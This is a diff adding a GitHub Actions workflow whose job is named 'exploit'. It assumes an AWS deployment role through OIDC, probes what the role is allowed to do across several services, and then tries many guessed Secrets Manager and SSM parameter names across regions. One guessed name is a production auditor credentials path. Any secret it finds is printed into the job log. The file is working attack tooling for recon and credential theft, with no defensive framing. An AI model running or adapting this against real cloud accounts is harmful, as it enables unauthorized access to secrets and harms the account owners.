@@ -1,0 +1,88 @@
+name: DEBUG WORKING ROLE - Deep Investigation
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+    - name: Assume Working Role
+      uses: aws-actions/configure-aws-credentials@v4
+      with:
+        role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
+        aws-region: us-west-1
+        role-session-name: DeepDebug
+        role-external-id: "internal/secrets/id-v2"
+        
+    - name: Debug What We Can Do
+      run: |
+        echo "🔍 DEBUGGING WHAT PERMISSIONS WE HAVE..."
+        aws sts get-caller-identity
+        
+        echo "📋 Trying to see what actions are allowed..."
+        aws iam get-account-summary 2>/dev/null || echo "No account access"
+        aws ec2 describe-regions --region us-west-1 2>/dev/null || echo "No EC2 access"
+        
+        echo "🗄️ Trying different AWS services..."
+        aws s3 ls 2>/dev/null || echo "No S3 list access"
+        aws logs describe-log-groups --region us-west-1 2>/dev/null || echo "No CloudWatch access"
+        
+    - name: Try All Possible Secret Variations
+      run: |
+        echo "🎯 TRYING EVERY POSSIBLE SECRET NAME..."
+        
+        # All variations of the external ID as secret name
+        for secret in \
+          "internal/secrets/id-v2" \
+          "internal-secrets-id-v2" \
+          "internal_secrets_id_v2" \
+          "internal.secrets.id.v2" \
+          "internal/secrets/id-v2-AbCdEf" \
+          "internal/secrets/id-v2-123456" \
+          "INTERNAL/SECRETS/ID-V2" \
+          "Internal/Secrets/Id-V2"; do
+          
+          echo "Trying: $secret"
+          aws secretsmanager get-secret-value --secret-id "$secret" --region us-west-1 2>/dev/null && {
+            echo "🎉 FOUND SECRET: $secret"
+            break
+          }
+        done
+        
+    - name: Try Parameter Store Extensively  
+      run: |
+        echo "📝 EXTENSIVE SSM PARAMETER SEARCH..."
+        
+        for param in \
+          "/internal/secrets/id-v2" \
+          "internal/secrets/id-v2" \
+          "internal.secrets.id.v2" \
+          "/hexnova404/internal/secrets/id-v2" \
+          "/github/deployment/secrets/id-v2" \
+          "/prod/readonly/auditor/credentials"; do
+          
+          echo "Trying SSM: $param"
+          aws ssm get-parameter --name "$param" --with-decryption --region us-west-1 2>/dev/null && {
+            echo "🎉 FOUND PARAMETER: $param"
+            break
+          }
+        done
+        
+    - name: Check Other Regions Systematically
+      run: |
+        echo "🌍 CHECKING ALL REGIONS..."
+        
+        for region in us-east-1 us-east-2 us-west-2 eu-west-1; do
+          echo "Trying region: $region"
+          result=$(aws secretsmanager get-secret-value --secret-id "internal/secrets/id-v2" --region "$region" 2>/dev/null)
+          if [ $? -eq 0 ]; then
+            echo "🎉 FOUND IN REGION: $region"
+            echo "$result"
+            break
+          fi
+        done
